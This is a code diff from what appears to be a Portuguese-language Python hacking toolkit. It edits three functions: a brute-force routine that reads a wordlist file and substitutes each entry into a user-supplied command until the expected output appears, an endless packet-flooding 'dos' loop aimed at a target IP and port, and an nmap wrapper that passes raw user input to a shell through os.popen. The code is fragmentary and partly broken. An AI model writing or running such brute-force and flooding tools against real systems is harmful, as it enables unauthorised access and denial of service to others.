@@ -5,7 +5,11 @@ def bruteforce(lang):
 	Sair = False
 	while(Sair==False):
 		wordlist = ['true','false']
-		comando=str(ui.input_dialog(lang[80])).split('::');expect_result=ui.input_dialog('Digite o que esperar na saida em caso de sucesso')
+		if os.path.exists('wordlist.txt'):
+			file = open('wordlist.txt','r')
+			wordlist = file.read().split()
+			file.close()
+		comando=str(ui.input_dialog('Digite o comando do brute force substituindo o lugar onde vai a senha por "::"')).split('::');expect_result=ui.input_dialog('Digite o que esperar na saida em caso de sucesso')
 		if len(comando) < 2:
 			... #Error,sem uso do ::
 		encontrado = False
@@ -25,9 +29,9 @@ def dos(lang):
 	port = ui.input_dialog()
 	sent = 0
 	while True:
-		socket.sendto(bytes, (ip,port))
-		sent = sent + 1;port = port + 1
-		print ("Sent {} packet to {} trought port:{}".format(sent,ip,port))
+		socket.send(bytes, (ip,port))
+		sent = sent + 1
+		print ("Enviado {} pacotes para {} pela porta:{}".format(sent,ip,port))
 		if port == 65534:
 			port = 1
 def nmap(lang):
@@ -35,6 +39,7 @@ def nmap(lang):
 	while(Sair==False):
 		ip = ui.input_dialog()
 		retorno = os.popen(f'nmap {ip}').read()
+		#print(retorno)
 		choice = ui.dialog_choice(retorno)
 		if choice == '1' or choice == '01':
 			pass
